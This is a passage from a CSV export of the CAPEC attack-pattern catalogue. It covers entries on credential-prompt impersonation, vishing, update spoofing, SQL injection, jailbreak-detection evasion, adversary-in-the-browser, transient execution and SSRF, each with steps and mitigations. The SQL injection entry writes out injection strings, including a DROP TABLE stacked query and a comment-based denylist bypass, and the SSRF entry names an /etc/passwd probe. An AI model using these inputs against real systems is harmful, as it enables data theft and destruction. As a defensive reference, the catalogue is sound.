adversary, through a previously installed malicious application, impersonates a credential prompt in an attempt to steal a user's credentials.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:504::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing their credentials.:TECHNIQUE:Determine what tasks prompt a user for their credentials.::STEP:2:PHASE:Exploit:DESCRIPTION:[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials.:TECHNIQUE:Prompt a user for their credentials, while making the user believe the credential request is legitimate.::\",\"::The adversary must already have access to the target system via some means.::A legitimate task must exist that an adversary can impersonate to glean credentials.::\",\"::SKILL:Once an adversary has gained access to the target system, impersonating a credential prompt is not difficult.:LEVEL:Low::\",\"::Malware or some other means to initially comprise the target system.::Additional malware to impersonate a legitimate credential prompt.::\",\"::Credential prompts that appear illegitimate or unexpected.::\",\"::SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::\",\"::The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.::\",\"::An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.::An adversary randomly prompts a user to enter their system credentials, tricking the user into believing that a background process requires the credentials to function. The adversary can then use these gleaned credentials to execute additional attacks or obtain data.::\",\"::1021::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1056:ENTRY NAME:Input Capture::::TAXONOMY NAME:ATTACK:ENTRY ID:1548.004:ENTRY NAME:Abuse Elevation Control Mechanism: Elevated Execution with Prompt::\",\"\",\n655,\"Avoid Security Tool Identification by Adding Data\",Detailed,Draft,\"An adversary adds data to a file to increase the file size beyond what security tools are capable of handling in an attempt to mask their actions. In addition to this, adding data to a file also changes the file's hash, frustrating security tools that look for known bad files by their hash.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:572::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"\",\"::Adding data to change the checksum of a file and can be used to avoid hash-based denylists and static anti-virus signatures.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.001:ENTRY NAME:Obfuscated Files or Information:Binary padding::\",\"\",\n656,\"Voice Phishing\",Detailed,Stable,\"An adversary targets users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Voice Phishing is a variation of the Phishing social engineering technique where the attack is initiated via a voice call, rather than email. The user is enticed to provide sensitive information by the adversary, who masquerades as a legitimate employee of the alleged organization. Voice Phishing attacks deviate from standard Phishing attacks, in that a user doesn't typically interact with a compromised website to provide sensitive information and instead provides this information verbally. Voice Phishing attacks can also be initiated by either the adversary in the form of a cold call or by the victim if calling an illegitimate telephone number.\",\"::TERM:Vishing:DESCRIPTION:::TERM:VoIP Phishing:DESCRIPTION:::\",High,High,\"::NATURE:ChildOf:CAPEC ID:98::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate organization more convincingly. The adversary can use homograph or similar attacks to convince users that they are using the legitimate website. If the adversary leverages cold-calling for this attack, this step is skipped.:TECHNIQUE:Optionally obtain a domain name that visually looks similar to the legitimate organization's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L):TECHNIQUE:Optionally obtain a legitimate SSL certificate for the new domain name.::STEP:2:PHASE:Explore:DESCRIPTION:[Explore legitimate website and create duplicate] An adversary optionally creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the organization's website that they are trying to impersonate. That website will contain a telephone number for the victim to call to assist them with their issue and initiate the attack. If the adversary leverages cold-calling for this attack, this step is skipped.:TECHNIQUE:Use spidering software to get copy of web pages on legitimate site.:TECHNIQUE:Manually save copies of required web pages from legitimate site.:TECHNIQUE:Create new web pages that have the legitimate site's look and feel, but contain completely new content.::STEP:3:PHASE:Exploit:DESCRIPTION:[Convince user to provide sensitive information to the adversary.] An adversary cold calls the victim or receives a call from the victim via the malicious site and provides a call-to-action, in order to persuade the user into providing sensitive details to the adversary (e.g. login credentials, bank account information, etc.). The key is to get the victim to believe that the individual they are talking to is from a legitimate entity with which the victim does business and that the call is occurring for legitimate reasons. A call-to-action will usually need to sound legitimate and urgent enough to prompt action from the user.:TECHNIQUE:Call the user a from a spoofed legitimate-looking telephone number.::STEP:4:PHASE:Exploit:DESCRIPTION:[Use stolen information] Once the adversary obtains the sensitive information, this information can be leveraged to log into the victim's bank account and transfer money to an account of their choice, or to make fraudulent purchases with stolen credit card information.:TECHNIQUE:Login to the legitimate site using another the victim's supplied credentials::\",\"::An adversary needs phone numbers to initiate contact with the victim, in addition to a legitimate-looking telephone number to call the victim from.::An adversary needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their hooks to many potential victims.::An adversary needs to have a sufficiently compelling call to action to prompt the user to take action.::If passively conducting this attack via a spoofed website, replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity.::\",\"::SKILL:Basic knowledge about websites: obtaining them, designing and implementing them, etc.:LEVEL:Medium::\",\"::Legitimate-looking telephone number(s) to initiate calls with victims::\",\"::You receive a call from an entity that you are not even a customer of prompting you to log into your account.::You receive any call that requests you provide sensitive information.::You are redirected to a website that instructs you to call the number on-screen to address the call-to-action.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Do not accept calls from unknown numbers or from numbers that may be flagged as spam. Also, do not call numbers that appear on-screen after being unexpectedly redirected to potentially malicious websites. In either case, do not provide sensitive information over voice calls that are not legitimately initiated. Instead, call your Bank, PayPal, eBay, etc., via the number on their public-facing website and inquire about the problem.::\",\"::The target receives an email or text message stating that their Apple ID has been disabled due to suspicious activity and that the included link includes instructions on how to unlock their Apple account. The link in the text message looks legitimate and once the link is clicked, the user is redirected to a legitimate-looking webpage that prompts the user to call a specified number to initiate the unlock process. The target initiates the phone call and provides their credentials or other sensitive information to the individual they assume works for Apple. Now that the adversary possess this data, it can be used to log into the account to obtain other sensitive data, such as Apple Pay information.::An adversary calls the target and claims to work for their bank. The adversary informs the target that their bank account has been frozen, due to potential fraudulent spending, and requires authentication in order to re-enable the account. The target, believing the caller is a legitimate bank employee, provides their bank account login credentials to confirm they are the authorized owner of the account. The adversary then confirms this authentication and claims that the account has been unlocked. Once the adversary has obtained these credentials, money can be transferred from the victim's account to an account controlled by the adversary.::\",\"\",\"\",\"\",\n657,\"Malicious Automated Software Update via Spoofing\",Detailed,Draft,\"An attackers uses identify or content spoofing to trick a client into performing an automated software update from a malicious source. A malicious automated software update that leverages spoofing can include content or identity spoofing as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. The result is the client believing there is a legitimate software update available but instead downloading a malicious update from the attacker.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:186::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Access Control:SCOPE:Availability:SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"::An example of the spoofing strategy would be the eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking.::\",\"::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1072:ENTRY NAME:Software Deployment Tools::\",\"\",\n66,\"SQL Injection\",Standard,Draft,\"This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:248::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] The attacker first takes an inventory of the functionality exposed by the application.:TECHNIQUE:Spider web sites for all available links:TECHNIQUE:Sniff network communications with application using a utility such as WireShark.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax.:TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Experiment:DESCRIPTION:[Experiment with SQL Injection vulnerabilities] After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.:TECHNIQUE:Use public resources such as SQL Injection Cheat Sheet at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.:TECHNIQUE:Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : ' OR 1=1; --, or something else that would syntactically complete a hypothesized query. Iteratively refine the query.:TECHNIQUE:Use Blind SQL Injection techniques to extract information about the database schema.:TECHNIQUE:If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: '; DROP TABLE SYSOBJECTS; -- and '); DROP TABLE SYSOBJECTS; --. These particular queries will likely not work because the SYSOBJECTS table is generally protected.::STEP:4:PHASE:Exploit:DESCRIPTION:[Exploit SQL Injection vulnerability] After refining and adding various logic to SQL queries, craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal, modify, and/or delete database data, using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent.:TECHNIQUE:Craft and Execute underlying SQL query::\",\"::SQL queries used by the application to store, retrieve or modify data.::User-controllable input that is not properly validated by the application as part of SQL queries.::\",\"::SKILL:It is fairly simple for someone with basic SQL knowledge to perform SQL injection, in general. In certain instances, however, specific knowledge of the database employed may be required.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"::Too many false or invalid queries to the database, especially those caused by malformed input.::\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.::Use of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::\",\"::With PHP-Nuke versions 7.9 and earlier, an attacker can successfully access and modify data, including sensitive contents such as usernames and password hashes, and compromise the application through SQL Injection. The protection mechanism against SQL Injection employs a denylist approach to input validation. However, because of an improper denylist, it is possible to inject content such as foo'/**/UNION or foo UNION/**/ to bypass validation and glean sensitive information from the database. See also: CVE-2006-5525::\",\"::89::1286::\",\"TAXONOMY NAME:WASC:ENTRY ID:19:ENTRY NAME:SQL Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:SQL Injection::\",\"\",\n660,\"Root/Jailbreak Detection Evasion via Hooking\",Detailed,Stable,\"An adversary forces a non-restricted mobile application to load arbitrary code or code files, via Hooking, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Adversaries may further leverage these capabilities to escalate privileges or bypass access control on legitimate applications. Although many mobile applications check if a mobile device is Rooted/Jailbroken prior to authorized use of the application, adversaries may be able to hook code in order to circumvent these checks. Successfully evading Root/Jailbreak detection allows an adversary to execute administrative commands, obtain confidential data, impersonate legitimate users of the application, and more.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:251::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).:TECHNIQUE:Search application stores for mobile applications worth exploiting::STEP:2:PHASE:Experiment:DESCRIPTION:[Develop code to be hooked into chosen target application] The adversary develops code or leverages existing code that will be hooked into the target application in order to evade Root/Jailbreak detection methods.:TECHNIQUE:Develop code or leverage existing code to bypass Root/Jailbreak detection methods.:TECHNIQUE:Test the code to see if it works.:TECHNIQUE:Iteratively develop the code until Root/Jailbreak detection methods are evaded.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute code hooking to evade Root/Jailbreak detection methods] Once hooking code has been developed or obtained, execute the code against the target application to evade Root/Jailbreak detection methods.:TECHNIQUE:Hook code into the target application.::\",\"::The targeted application must be non-restricted to allow code hooking.::\",\"::SKILL:Knowledge about Root/Jailbreak detection and evasion techniques.:LEVEL:High::SKILL:Knowledge about code hooking.:LEVEL:Medium::\",\"::The adversary must have a Rooted/Jailbroken mobile device.::The adversary needs to have enough access to the target application to control the included code or file.::\",\"\",\"::SCOPE:Integrity:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Through Root/Jailbreak Detection Evasion via Hooking, the adversary compromises the integrity of the application.::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data:NOTE:An adversary may leverage Root/Jailbreak Detection Evasion via Hooking in order to obtain sensitive information.::\",\"::Ensure mobile applications are signed appropriately to avoid code inclusion via hooking.::Inspect the application's memory for suspicious artifacts, such as shared objects/JARs or dylibs, after other Root/Jailbreak detection methods.::Inspect the application's stack trace for suspicious method calls.::Allow legitimate native methods, and check for non-allowed native methods during Root/Jailbreak detection methods.::For iOS applications, ensure application methods do not originate from outside of Apple's SDK.::\",\"::An adversary targets a non-restricted iOS banking application in an attempt to compromise sensitive user data. The adversary creates Objective-C runtime code that always returns false when checking for the existence of the Cydia application. The malicious code is then dynamically loaded into the application via the DYLD_INSERT_LIBRARIES environment variable. When the banking applications checks for Cydia, the hooked code returns false, so the application assumes the device is stock (i.e. not Jailbroken) and allows it to access the application. However, the adversary has just evaded Jailbreak detection and is now able to glean user credentials and/or transaction details.::An adversary targets a mobile voting application on an Android device with the goal of committing voter fraud. Leveraging the Xposed framework, the adversary is able to create and hook Java code into the application that bypasses Root detection methods. When the voting application attempts to detect a Rooted device by checking for commonly known installed packages associated with Rooting, the hooked code removes the suspicious packages before returning to the application. As a result, the application believes the device is stock (i.e. not Rooted) when in actuality this is not the case. Having evading Root detection, the adversary is now able to cast votes for the candidate of their choosing as a variety of different users.::\",\"::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1055:ENTRY NAME:Process Injection::\",\"\",\n661,\"Root/Jailbreak Detection Evasion via Debugging\",Detailed,Stable,\"An adversary inserts a debugger into the program entry point of a mobile application to modify the application binary, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Rooting/Jailbreaking a mobile device also provides users with access to system debuggers and disassemblers, which can be leveraged to exploit applications by dumping the application's memory at runtime in order to remove or bypass signature verification methods. This further allows the adversary to evade Root/Jailbreak detection mechanisms, which can result in execution of administrative commands, obtaining confidential data, impersonating legitimate users of the application, and more.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:121::NATURE:CanPrecede:CAPEC ID:68::NATURE:CanPrecede:CAPEC ID:660::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).:TECHNIQUE:Search application stores for mobile applications worth exploiting::STEP:2:PHASE:Experiment:DESCRIPTION:[Debug the target application] The adversary inserts the debugger into the program entry point of the mobile application, after the application's signature has been identified, to dump its memory contents.:TECHNIQUE:Insert the debugger at the mobile application's program entry point, after the application's signature has been identified.:TECHNIQUE:Dump the memory region containing the now decrypted code from the address space of the binary.::STEP:3:PHASE:Experiment:DESCRIPTION:[Remove application signature verification methods] Remove signature verification methods from the decrypted code and resign the application with a self-signed certificate.::STEP:4:PHASE:Exploit:DESCRIPTION:[Execute the application and evade Root/Jailbreak detection methods] The application executes with the self-signed certificate, while believing it contains a trusted certificate. This now allows the adversary to evade Root/Jailbreak detection via code hooking or other methods.:TECHNIQUE:Optional: Hook code into the target application.::\",\"::A debugger must be able to be inserted into the targeted application.::\",\"::SKILL:Knowledge about Root/Jailbreak detection and evasion techniques.:LEVEL:High::SKILL:Knowledge about runtime debugging.:LEVEL:Medium::\",\"::The adversary must have a Rooted/Jailbroken mobile device with debugging capabilities.::\",\"\",\"::SCOPE:Integrity:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Through Root/Jailbreak Detection Evasion via Debugging, the adversary compromises the integrity of the application.::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data:NOTE:An adversary may leverage Root/Jailbreak Detection Evasion via Debugging in order to obtain sensitive information.::\",\"::Instantiate checks within the application code that ensures debuggers are not attached.::\",\"::An adversary targets an iOS banking application in an attempt to compromise sensitive user data. The adversary launches the application with the iOS debugger and sets a breakpoint at the program entry point, after the application's signature has been verified. Next, the adversary dumps the memory region that contains the decrypted code from the address space of the binary. The 'Restrict' flag is then stripped from the application and the adversary resigns the application with a self-signed certificate. The application is now executed without the 'Restrict' flag, while trusting the self-signed certificate to be legitimate. However, the adversary is now able to evaded Jailbreak detection via code hooking or other methods and can glean user credentials and/or transaction details.::\",\"::489::\",\"\",\"\",\n662,\"Adversary in the Browser (AiTB)\",Standard,Stable,\"An adversary exploits security vulnerabilities or inherent functionalities of a web browser, in order to manipulate traffic between two endpoints.\",\"::TERM:Man in the Browser:DESCRIPTION:::TERM:Boy in the Browser:DESCRIPTION:::TERM:Man in the Mobile:DESCRIPTION:::\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:94::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:The adversary tricks the victim into installing the Trojan Horse malware onto their system.:TECHNIQUE:Conduct phishing attacks, drive-by malware installations, or masquerade malicious browser extensions as being legitimate.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.::STEP:3:PHASE:Exploit:DESCRIPTION:The adversary observes, filters, or alters passed data of their choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.::\",\"::The adversary must install or convince a user to install a Trojan.::There are two components communicating with each other.::An attacker is able to identify the nature and mechanism of communication between the two target components.::Strong mutual authentication is not used between the two target components yielding opportunity for adversarial interposition.::For browser pivoting, the SeDebugPrivilege and a high-integrity process must both exist to execute this attack.::\",\"::SKILL:Tricking the victim into installing the Trojan is often the most difficult aspect of this attack. Afterwards, the remainder of this attack is fairly trivial.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Ensure software and applications are only downloaded from legitimate and reputable sources, in addition to conducting integrity checks on the downloaded component.::Leverage anti-malware tools, which can detect Trojan Horse malware.::Use strong, out-of-band mutual authentication to always fully authenticate both ends of any communications channel.::Limit user permissions to prevent browser pivoting.::Ensure browser sessions are regularly terminated and when their effective lifetime ends.::\",\"::An adversary conducts a phishing attack and tricks a victim into installing a malicious browser plugin. The adversary then positions themself between the victim and their banking institution. The victim begins by initiating a funds transfer from their personal savings to their personal checking account. Using injected JavaScript, the adversary captures this request and modifies it to transfer an increased amount of funds to an account that they controls, before sending it to the bank. The bank processes the transfer and sends the confirmation notice back to the victim, which is instead intercepted by the adversary. The adversary modifies the confirmation to reflect the original transaction details and sends this modified message back to the victim. Upon receiving the confirmation, the victim assumes the transfer was successful and is unaware that their money has just been transferred to the adversary.::In 2020, the Agent Tesla malware was leveraged to conduct AiTB attacks against organizations within the gas, oil, and other energy sectors. The malware was delivered via a spearphishing campaign and has the capability to form-grab, keylog, copy clipboard data, extract credentials, and capture screenshots. [REF-630]::Boy in the browser attacks are a subset of AiTB attacks. Similar to AiTB attacks, the adversary must first trick the victim into installing a Trojan, either via social engineering or drive-by-download attacks. The malware then modifies the victim's hosts file in order to reroute web traffic from an intended website to an adversary-controlled website that mimics the legitimate website. The adversary is now able to observe, intercept, and/or modify all traffic, as in a traditional Adversary in the Middle attack (CAPEC-94). BiTB attacks are low-cost, easy to execute, and more difficult to detect since the malware often removes itself once the attack has concluded. [REF-631]::Man in the Mobile attacks are a subset of AiTB attacks that target mobile device users. Like AiTB attacks, an adversary convinces a victim to install a Trojan mobile application on their mobile device, often under the guise of security. Once the victim has installed the application, the adversary can capture all SMS traffic to bypass SMS-based out-of-band authentication systems. [REF-632]::\",\"::300::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1185:ENTRY NAME:Man in the Browser::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Man-in-the-browser attack::\",\"\",\n663,\"Exploitation of Transient Instruction Execution\",Standard,Stable,\"An adversary exploits a hardware design flaw in a CPU implementation of transient instruction execution to expose sensitive data and bypass/subvert access control over restricted resources. Typically, the adversary conducts a covert channel attack to target non-discarded microarchitectural changes caused by transient executions such as speculative execution, branch prediction, instruction pipelining, and/or out-of-order execution. The transient execution results in a series of instructions (gadgets) which construct covert channel and access/transfer the secret data.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:74::NATURE:ChildOf:CAPEC ID:184::NATURE:CanPrecede:CAPEC ID:141::NATURE:PeerOf:CAPEC ID:212::NATURE:PeerOf:CAPEC ID:124::NATURE:PeerOf:CAPEC ID:180::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey target application and relevant OS shared code libraries] Adversary identifies vulnerable transient instruction sets and the code/function calls to trigger them as well as instruction sets or code fragments (gadgets) to perform attack.:TECHNIQUE:Utilize Disassembler and Debugger tools to examine and trace instruction set execution of source code and shared code libraries on a system.::STEP:2:PHASE:Explore:DESCRIPTION:[Explore cache and identify impacts] Utilize tools to understand the impact of transient instruction execution upon address spaces and CPU operations.:TECHNIQUE:Run OS or application specific tools that examine the contents of cache.::STEP:1:PHASE:Experiment:DESCRIPTION:[Cause conditions for identified transient instruction set execution] Adversary ensures that specific code/instructions of the target process are executed by CPU, so desired transient instructions are executed.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause specific secret data to be cached from restricted address space] Executed instruction sets (gadgets) in target address space, initially executed via adversary-chosen transient instructions sets, establish covert channel and transfer secret data across this channel to cache.:TECHNIQUE:Prediction-based - adversary trains CPU to incorrectly predict/speculate conditions for instruction execution to be true, hence executing adversary-chosen transient instructions. These prediction-based methods include: Pattern History Table (PHT)/Input Validation Bypass, Branch Target Buffer (BTB)/Branch Target Injection, Return Stack Buffer (RSB)/Return Address Injection, and Store To Load (STL)/Speculative Store Bypass.:TECHNIQUE:Exception/Fault-based - adversary has CPU execute transient instructions that raise an exception allowing inaccessible memory space to be accessed via out-of-order execution. These exception/fault-based methods include: Supervisor-only Bypass, Virtual Translation Bypass, System Register Bypass, FPU Register Bypass, Read-only Bypass, Protection Key Bypass, and Bounds Check Bypass.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform covert channel attack to obtain/access secret data] Adversary process code removes instructions/data from shared cache set, waits for target process to reinsert them back into cache, to identify location of secret data via a timing method. Adversary continuously repeat this process to identify and access entirety of targeted secret data.:TECHNIQUE:Flush+Reload - adversary frequently flushes targeted memory cache line using a dedicated machine flush instruction, and uses another process to measure time taken for CPU to load victim secret data.:TECHNIQUE:Evict+Time - adversary causes victim to load target set into cache and measures time for victim process to load this data, setting a baseline. Adversary evicts a specified cache line and causes victim process to execute again, and measures any change in execution time, to determine if cache line was accessed.:TECHNIQUE:Prime+Probe - adversary primes cache by filling cache line(s) or set(s) with data, after some time victim process evicts this adversary data to replace it with secret data. The adversary then probes/accesses all the previously accessed cache lines detecting cache misses, which determine that their attacker data has been evicted and replaced with secret data from victim process.::\",\"::The adversary needs at least user execution access to a system and a maliciously crafted program/application/process with unprivileged code to misuse transient instruction set execution of the CPU.::\",\"::SKILL:Detailed knowledge on how various CPU architectures and microcode perform transient execution for various low-level assembly language code instructions/operations.:LEVEL:High::SKILL:Detailed knowledge on compiled binaries and operating system shared libraries of instruction sequences, and layout of application and OS/Kernel address spaces for data leakage.:LEVEL:High::\",\"::C2C mechanism or direct access to victim system, capable of dropping malicious program and collecting covert channel attack data.::Malicious program capable of triggering execution of transient instructions or vulnerable instruction sequences of victim program and performing a covert channel attack to gather data from victim process memory space. Ultimately, the speed with which an attacker discovers a secret is directly proportional to the computational resources of the victim machine.::\",\"::File Signatures for Malicious Software capable of abusing Transient Instruction Set Execution::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Implementation: DAWG (Dynamically Allocated Way Guard) - processor cache properly divided between different programs/processes that don't share resources::Implementation: KPTI (Kernel Page-Table Isolation) to completely separate user-space and kernel space page tables::Configuration: Architectural Design of Microcode to limit abuse of speculative execution and out-of-order execution::Configuration: Disable SharedArrayBuffer for Web Browsers::Configuration: Disable Copy-on-Write between Cloud VMs::Configuration: Privilege Checks on Cache Flush Instructions::Implementation: Non-inclusive Cache Memories to prevent Flush+Reload Attacks::\",\"::A web browser with user-privileges executes JavaScript code imbedded within a malicious website. The system does not disable shared buffers for the web browser and there is no restriction or check upon user-process execution of flush or evict instructions. The Javascript code executes vulnerable transient instructions upon system to cause microarchitectural changes that establish covert channel and transfer sensitive/secret data into shared cache from address space of either kernel, web browser or another executing process on the system.::\",\"::1037::1303::1264::\",\"\",\"\",\n664,\"Server Side Request Forgery\",Standard,Stable,\"An adversary exploits improper input validation by submitting maliciously crafted input to a target application running on a server, with the goal of forcing the server to make a request either to itself, to web services running in the server’s internal network, or to external third parties. If successful, the adversary’s request will be made with the server’s privilege level, bypassing its authentication controls. This ultimately allows the adversary to access sensitive data, execute commands on the server’s network, and make external requests with the stolen identity of the server. Server Side Request Forgery attacks differ from Cross Site Request Forgery attacks in that they target the server itself, whereas CSRF attacks exploit an insecure user authentication mechanism to perform unauthorized actions on the user's behalf.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:115::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find target application] Find target web application that accepts a user input and retrieves data from the server::STEP:2:PHASE:Experiment:DESCRIPTION:[Examine existing application requests] Examine HTTP/GET requests to view the URL query format. Adversaries test to see if this type of attack is possible through weaknesses in an application's protection to Server Side Request Forgery:TECHNIQUE:Attempt manipulating the URL to retrieve an error response/code from the server to determine if URL/request validation is done.:TECHNIQUE:Use a list of XSS probe strings to specify as parameters to known URLs. If possible, use probe strings with unique identifiers.:TECHNIQUE:Create a GET request with a common server file path such as /etc/passwd as a parameter and examine output.::STEP:3:PHASE:Exploit:DESCRIPTION:[Malicious request] Adversary crafts a malicious URL request that assumes the privilege level of the server to query internal or external network services and sends the request to the application::\",\"::Server must be running a web application that processes HTTP requests.::\",\"::SKILL:The adversary will have to detect the vulnerability through an intermediary service or specify maliciously crafted URLs and analyze the server response.:LEVEL:Medium::SKILL:The adversary will be required to access internal resources, extract information, or leverage the services running on the server to perform unauthorized actions such as traversing the local network or routing a reflected TCP DDoS through them.:LEVEL:High::\",\"::[None] No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::\",\"::Handling incoming requests securely is the first line of action to mitigate this vulnerability. This can be done through URL validation.::Further down the process flow, examining the response and verifying that it is as expected before sending would be another way to secure the server.::Allowlist the DNS name or IP address of every service the web application is required to access is another effective security measure. This ensures the server cannot make external requests to arbitrary services.::Requiring authentication for local services adds another layer of security between the adversary and internal services running on the server. By enforcing local authentication, an adversary will not gain access to all internal services only with access to the server.::Enforce the usage of relevant URL schemas. By limiting requests be made only through HTTP or HTTPS, for example, attacks made through insecure schemas such as file://, ftp://, etc. can be 